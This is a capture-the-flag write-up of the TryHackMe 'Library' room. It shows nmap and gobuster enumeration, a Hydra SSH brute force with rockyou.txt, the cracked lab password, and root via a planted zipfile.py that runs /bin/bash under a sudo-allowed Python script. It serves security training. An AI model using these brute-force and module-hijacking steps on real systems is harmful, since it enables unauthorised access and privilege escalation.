#  TryHackMe - Library Write-Up

A complete walkthrough of the **Library** room on TryHackMe. This room focuses on basic enumeration, SSH brute-forcing, web directory discovery, and privilege escalation through **Python Library Hijacking**.

---

#  Room Information

| Category | Details |
|-----------|-----------|
| Room | Library |
| Platform | TryHackMe |
| Difficulty | Easy |
| Target OS | Linux (Ubuntu) |

---

#  Learning Objectives

During this room, I practiced:

- Network Enumeration with Nmap
- Web Enumeration
- Directory Discovery with Gobuster
- SSH Brute-Forcing using Hydra
- Linux Privilege Escalation
- Python Module Hijacking

---

#  Step 1: Network Scanning

The first step was to identify open ports and running services on the target machine.

```bash
nmap -sC -sV -O <target_ip>
```

### Explanation

- `-sC` → Runs default NSE scripts.
- `-sV` → Detects service versions.
- `-O` → Attempts OS detection.

### Result

The scan revealed **two open ports**:

| Port | Service |
|--------|--------|
| 22 | SSH |
| 80 | HTTP |

Since a web server was available, I started with web enumeration.

---

#  Step 2: Web Enumeration

I visited the website running on port 80 and reviewed the page source code.

### Findings

While browsing the website and inspecting the source code, I did not find any obvious sensitive information.

However, I noticed an interesting username:

```text
meliodas
```

This username would later become useful during the SSH attack.

---

#  Step 3: Directory Enumeration

Since the website did not reveal much information, I used **Gobuster** to discover hidden files and directories.

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

### Findings

#### robots.txt

While enumerating directories, I discovered:

```text
/robots.txt
```

Opening the file revealed:

```text
rockyou
```

was listed as a disallowed entry.

This was a strong hint that the famous **rockyou.txt** password wordlist might be useful later.


---

#### Images Directory

While exploring the discovered directories, I also found an images directory that exposed information about the Apache version being used.

Although this did not directly lead to exploitation, it provided additional information about the target environment.

---

#  Step 4: SSH Brute Force

At this stage we had:

- SSH running on Port 22
- A valid username: `meliodas`
- A hint pointing toward `rockyou.txt`

I decided to perform a targeted SSH brute-force attack using **Hydra**.

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
```

### Explanation

- `-l meliodas` → Username to attack
- `-P rockyou.txt` → Password wordlist
- `ssh://` → Target SSH service

### Result

Hydra successfully discovered the password:

```text
Username: meliodas
Password: iloveyou_
```
<img width="952" height="403" alt="hydra" src="https://github.com/user-attachments/assets/e9f4a6db-9bae-4bea-b2ee-4d7eda06bc3e" />

---

#  Step 5: SSH Access

Using the discovered credentials, I connected to the target machine.

```bash
ssh meliodas@<target_ip>
```

After entering the password:

```text
iloveyou_
```

I gained access as the user **meliodas**.

<img width="877" height="407" alt="Screenshot_2026-06-08_03-11-09" src="https://github.com/user-attachments/assets/bdc1bc91-4d43-4ef1-924e-1e3651ec139c" />



---


#  Step 6: User Flag

After logging in, I searched the user's home directory and located the user flag.

```bash
cat /home/meliodas/user.txt
```

The user flag was successfully retrieved.

---

#  Step 7: Privilege Escalation Enumeration

The next objective was to obtain root access.

A common first step is checking sudo permissions.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

### Observation

The user could execute:

```text
/home/meliodas/bak.py
```

with root privileges and **without a password**.

This was a strong privilege escalation opportunity.

---

#  Step 8: Analyzing the Python Script

I inspected the backup script.

```bash
cat /home/meliodas/bak.py
```
<img width="816" height="291" alt="bak" src="https://github.com/user-attachments/assets/d0d5f372-a2e3-4379-8992-1a70db8e22cd" />


Inside the script, I noticed:

```python
import zipfile
```

### Important Observation

The script imports the Python module:

```python
zipfile
```

Python searches for modules using its module search path (`sys.path`).

Typically, Python checks the current working directory before loading standard library modules.

This behavior can sometimes be abused through **Python Library Hijacking**.

---

#  Step 9: Python Library Hijacking

Since the script imports `zipfile`, I created my own malicious module named:

```text
zipfile.py
```

inside the current directory.

```bash
echo "import os; os.system('/bin/bash')" > zipfile.py
```

### What This Does

When Python tries to load the `zipfile` module:

1. It searches the current directory first.
2. It finds our malicious `zipfile.py`.
3. Our code executes instead of the legitimate module.
4. Since the script is being run with sudo, the code executes as root.

---

#  Step 10: Execute the Vulnerable Script

Now I triggered the allowed sudo command.

```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
```

Because Python loaded our malicious module, a root shell was spawned.

---

#  Step 11: Root Access

Verifying privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Successful privilege escalation!
<img width="938" height="392" alt="root1" src="https://github.com/user-attachments/assets/4631eb1c-ef2c-4841-8715-2a0c2c3dde52" />

---

#  Step 12: Root Flag

With root privileges obtained, I accessed the final flag.

```bash
cat /root/root.txt
```

The root flag was successfully retrieved.

---

#  Conclusion

This room demonstrates how small pieces of information gathered during enumeration can be chained together to compromise a system:

1. Enumerated the target using Nmap.
2. Discovered the username **meliodas** from the website.
3. Found a hint to **rockyou.txt** through `robots.txt`.
4. Brute-forced SSH credentials using Hydra.
5. Logged in via SSH.
6. Enumerated sudo permissions.
7. Identified a Python script executable as root.
8. Exploited Python's module search path using **Library Hijacking**.
9. Obtained a root shell and captured the final flag.

---

#  Tools Used

- Nmap
- Gobuster
- Hydra
- SSH
- Linux Enumeration Commands
- Python

---
**Room Completed Successfully ✅**
